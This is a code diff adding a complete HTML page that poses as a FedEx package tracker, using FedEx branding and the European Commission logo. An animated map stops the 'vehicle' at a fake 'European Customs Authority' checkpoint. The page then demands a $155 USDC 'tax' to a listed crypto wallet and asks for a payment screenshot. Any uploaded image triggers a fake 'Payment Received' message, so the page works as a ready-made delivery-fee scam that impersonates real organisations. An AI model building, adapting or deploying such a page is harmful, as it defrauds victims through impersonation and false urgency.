@@ -1,1 +1,190 @@
-# Cargo-cash.delivery
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>FedEx Delivery Tracker</title>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f5f5f5;
+      color: #333;
+      text-align: center;
+      padding: 20px;
+    }
+    h1 {
+      color: #4d148c;
+    }
+    h2, h3 {
+      color: #ff6600;
+    }
+    #map {
+      height: 500px;
+      width: 100%;
+      max-width: 800px;
+      margin: 20px auto;
+      border: 2px solid #4d148c;
+    }
+    #paymentPrompt, #confirmation {
+      display: none;
+    }
+    .blinking {
+      animation: blink 1s infinite;
+      color: red;
+      font-weight: bold;
+    }
+    @keyframes blink {
+      0% { opacity: 1; }
+      50% { opacity: 0; }
+      100% { opacity: 1; }
+    }
+    input[type="file"] {
+      margin-top: 10px;
+    }
+    button {
+      background-color: #4d148c;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      font-size: 16px;
+      cursor: pointer;
+      border-radius: 5px;
+    }
+    button:hover {
+      background-color: #ff6600;
+    }
+    code {
+      background-color: #eee;
+      padding: 2px 6px;
+      border-radius: 4px;
+    }
+    #status {
+      margin-top: 10px;
+      font-weight: bold;
+      color: #4d148c;
+    }
+    #countdown {
+      font-size: 18px;
+      margin-top: 10px;
+      color: #ff6600;
+    }
+    #badge {
+      margin-top: 10px;
+    }
+    #badge img {
+      width: 100px;
+    }
+  </style>
+</head>
+<body>
+  <h1>📦 FedEx Delivery Tracker</h1>
+  <h3>Tracking ID: <code>6910559669</code></h3>
+  <div id="status">Status: Vehicle departing from Vienna...</div>
+
+  <div id="map"></div>
+
+  <div id="paymentPrompt">
+    <h3>🛑 Vehicle Held by European Customs Authority</h3>
+    <div id="badge">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/European_Commission.svg/1200px-European_Commission.svg.png" alt="Customs Badge" />
+    </div>
+    <p>Reason: Cash Flow Irregularity in Dispatch</p>
+    <p>Required Tax Payment: <strong>$155 USDC</strong></p>
+    <p><strong>USDC Wallet Address:</strong> <code>0x3140ee41555a14a7e0c4c96a636e63b24946d4f9</code></p>
+    <p class="blinking">📍 Vehicle is currently held at checkpoint</p>
+    <p><strong>Upload screenshot of payment to continue delivery:</strong></p>
+    <input type="file" accept="image/*" onchange="confirmDelivery()" />
+  </div>
+
+  <div id="confirmation">
+    <h2>✅ Payment Received</h2>
+    <p>Your FedEx package is now resuming delivery to Audi HQ.</p>
+    <div id="countdown">Resuming in: <span id="timer">00:00</span></div>
+    <img id="uploadedImage" src="" alt="Payment Screenshot" style="max-width: 100%; margin-top: 20px;" />
+  </div>
+
+  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+  <script>
+    const map = L.map('map').setView([48.2082, 16.3738], 6); // Vienna
+
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+      attribution: 'Map data © OpenStreetMap contributors'
+    }).addTo(map);
+
+    const route = [
+      [48.2082, 16.3738], // Vienna
+      [48.5, 13.5],       // Midpoint
+      [48.8, 11.4],       // Checkpoint
+      [48.8136, 11.4666]  // Audi HQ
+    ];
+
+    const checkpointIndex = 2;
+    let currentIndex = 0;
+
+    const vehicleIcon = L.icon({
+      iconUrl: 'https://cdn-icons-png.flaticon.com/512/1995/1995526.png',
+      iconSize: [40, 40],
+      iconAnchor: [20, 20]
+    });
+
+    const vehicleMarker = L.marker(route[0], { icon: vehicleIcon }).addTo(map);
+
+    const polyline = L.polyline(route, { color: '#4d148c' }).addTo(map);
+    map.fitBounds(polyline.getBounds());
+
+    function updateStatus(text) {
+      document.getElementById("status").innerText = "Status: " + text;
+    }
+
+    function moveVehicle() {
+      if (currentIndex < route.length - 1) {
+        currentIndex++;
+        vehicleMarker.setLatLng(route[currentIndex]);
+
+        if (currentIndex === checkpointIndex) {
+          updateStatus("Vehicle held at customs checkpoint");
+          document.getElementById("paymentPrompt").style.display = "block";
+        } else {
+          updateStatus("Vehicle en route...");
+          setTimeout(moveVehicle, 3000);
+        }
+      } else {
+        updateStatus("Vehicle arrived at Audi HQ");
+      }
+    }
+
+    setTimeout(moveVehicle, 3000); // Start movement
+
+    function confirmDelivery() {
+      const fileInput = event.target;
+      const reader = new FileReader();
+      reader.onload = function(e) {
+        document.getElementById("uploadedImage").src = e.target.result;
+        document.getElementById("paymentPrompt").style.display = "none";
+        document.getElementById("confirmation").style.display = "block";
+        updateStatus("Payment received. Resuming delivery...");
+
+        startCountdown(10); // 10 seconds countdown before resuming
+      };
+      reader.readAsDataURL(fileInput.files[0]);
+    }
+
+    function startCountdown(seconds) {
+      let remaining = seconds;
+      const timerDisplay = document.getElementById("timer");
+      const interval = setInterval(() => {
+        timerDisplay.textContent = `00:${remaining < 10 ? '0' : ''}${remaining}`;
+        remaining--;
+        if (remaining < 0) {
+          clearInterval(interval);
+          document.getElementById("confirmation").style.display = "none";
+          currentIndex++;
+          vehicleMarker.setLatLng(route[currentIndex]);
+          updateStatus("Vehicle resumed delivery to Audi HQ");
+        }
+      }, 1000);
+    }
+  </script>
+</body>
+</html>
